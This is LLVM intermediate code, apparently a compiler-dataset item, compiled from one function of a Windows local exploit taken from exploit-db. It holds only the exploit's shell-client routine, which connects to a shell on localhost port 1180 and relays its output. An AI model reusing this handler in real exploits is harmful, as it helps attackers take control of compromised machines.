; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_395.c_sh.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_395.c_sh.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.in_addr, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [36 x i8] c"[-] damn.. it looks like it failed\0A\00", align 1
@.str.1 = private unnamed_addr constant [17 x i8] c"[+] connected.\0A\0A\00", align 1
@client2serv = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [19 x i8] c"[-] shell.select()\00", align 1
@.str.3 = private unnamed_addr constant [17 x i8] c"[-] shell.recv()\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"%s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @sh() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  store i64 16777343, i64* %7, align 8
  %8 = call i32 @WSAStartup(i32 514, i32* %3)
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i32 0, i32 0
  store i32 2, i32* %9, align 4
  %10 = call i32 @htons(i32 1180)
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i32 0, i32 2
  store i32 %10, i32* %11, align 4
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i32 0, i32 1
  %13 = bitcast i64* %7 to %struct.in_addr*
  %14 = bitcast %struct.in_addr* %12 to i8*
  %15 = bitcast %struct.in_addr* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %14, i8* align 8 %15, i64 4, i1 false)
  %16 = call i64 @socket(i32 2, i32 1, i32 6)
  store i64 %16, i64* %2, align 8
  %17 = load i64, i64* %2, align 8
  %18 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %19 = call i64 @connect(i64 %17, %struct.sockaddr* %18, i32 16)
  %20 = icmp ne i64 %19, 0
  %21 = zext i1 %20 to i32
  store i32 %21, i32* %1, align 4
  br i1 %20, label %22, label %24

22:                                               ; preds = %0
  %23 = call i32 @fatal(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str, i64 0, i64 0))
  br label %26

24:                                               ; preds = %0
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.1, i64 0, i64 0))
  br label %26

26:                                               ; preds = %24, %22
  %27 = load i64, i64* @client2serv, align 8
  %28 = inttoptr i64 %27 to i8*
  %29 = load i64, i64* %2, align 8
  %30 = inttoptr i64 %29 to i64*
  %31 = call i32 @CreateThread(i32 0, i32 0, i8* %28, i64* %30, i32 0, i32 0)
  br label %32

32:                                               ; preds = %61, %26
  %33 = call i32 @FD_ZERO(i32* %6)
  %34 = load i64, i64* %2, align 8
  %35 = call i32 @FD_SET(i64 %34, i32* %6)
  %36 = load i64, i64* %2, align 8
  %37 = add nsw i64 %36, 1
  %38 = call i64 @select(i64 %37, i32* %6, i32* null, i32* null, i32* null)
  %39 = icmp slt i64 %38, 0
  br i1 %39, label %40, label %42

40:                                               ; preds = %32
  %41 = call i32 @fatal(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.2, i64 0, i64 0))
  br label %42

42:                                               ; preds = %40, %32
  %43 = load i64, i64* %2, align 8
  %44 = call i64 @FD_ISSET(i64 %43, i32* %6)
  %45 = icmp ne i64 %44, 0
  br i1 %45, label %46, label %61

46:                                               ; preds = %42
  %47 = load i64, i64* %2, align 8
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %49 = call i32 @recv(i64 %47, i8* %48, i32 4096, i32 0)
  store i32 %49, i32* %1, align 4
  %50 = icmp slt i32 %49, 1
  br i1 %50, label %51, label %53

51:                                               ; preds = %46
  %52 = call i32 @fatal(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.3, i64 0, i64 0))
  br label %53

53:                                               ; preds = %51, %46
  %54 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %55 = load i32, i32* %1, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds i8, i8* %54, i64 %56
  %58 = call i32 @memset(i8* %57, i32 0, i32 1)
  %59 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i8* %59)
  br label %61

61:                                               ; preds = %53, %42
  br label %32
}

declare dso_local i32 @WSAStartup(i32, i32*) #1

declare dso_local i32 @htons(i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i64 @socket(i32, i32, i32) #1

declare dso_local i64 @connect(i64, %struct.sockaddr*, i32) #1

declare dso_local i32 @fatal(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @CreateThread(i32, i32, i8*, i64*, i32, i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i64, i32*) #1

declare dso_local i64 @select(i64, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i64, i32*) #1

declare dso_local i32 @recv(i64, i8*, i32, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
